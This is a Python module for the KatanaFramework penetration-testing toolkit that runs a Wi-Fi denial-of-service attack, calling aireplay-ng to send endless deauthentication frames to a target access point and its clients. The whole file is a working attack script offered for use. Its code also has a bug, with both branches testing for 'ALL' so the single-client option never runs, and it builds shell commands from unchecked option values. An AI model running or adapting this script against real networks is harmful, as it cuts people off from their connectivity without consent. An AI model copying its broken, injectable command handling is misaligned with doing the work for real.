# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KATANAFRAMEWORK import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  
from core.Function import get_interfaces,get_monitors_mode,checkDevice,Subprocess
import commands,subprocess
# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="2.1"
	init.Description        ="Wifi Denegation of service"
	init.CodeName           ="wifi/ap.dos"
	init.DateCreation       ="11/06/2015"      
	init.LastModification   ="24/05/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE              RQ     DESCRIPTION
		'drive'  :[INTERFACE_MONITOR,True ,'Interface'],
		'bssid'  :[MAC_TARGET       ,True ,'AP Mac Address'],
		'target' :["ALL"            ,True ,'Targes'],
	}

	# AUX INFORMATION MODULE
	init.aux = """
 (target) options 
 -> [ALL] all wireless clients.
 -> [MAC] a single client access.

 Devices Founds: """+str(get_interfaces())+"""
 Monitors Inter: """+str(get_monitors_mode())+"""
 Functions     : For Scan Ap's, type 'f::get_aps(Monitor_Interface,Time)'
                 For Start Monitor Mode, type 'f::start_monitor(Interface)' 
 """
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	if checkDevice(init.var['drive']):
		if   init.var['target']  == "ALL": Subprocess("aireplay-ng -0 0 -a "+init.var['bssid']+" "+init.var['drive'])
		elif init.var['target']  == "ALL": Subprocess("aireplay-ng -0 0 -a "+init.var['bssid']+" -c "+init.var['target']+" "+init.var['drive'])
		else:
			init.var['target'] = "ALL"
			printAlert(1,"Type not allow, use show options or sop and see Auxiliar help.")
			return

		printAlert(0,"Starting attack to "+init.var['target']+" with [aireplay-ng]")
		raw_input(printAlert(8,"to stop DOS Attack (PRESS ANY KEY)\n"))
		subprocess.call("killall aireplay-ng", shell=True)
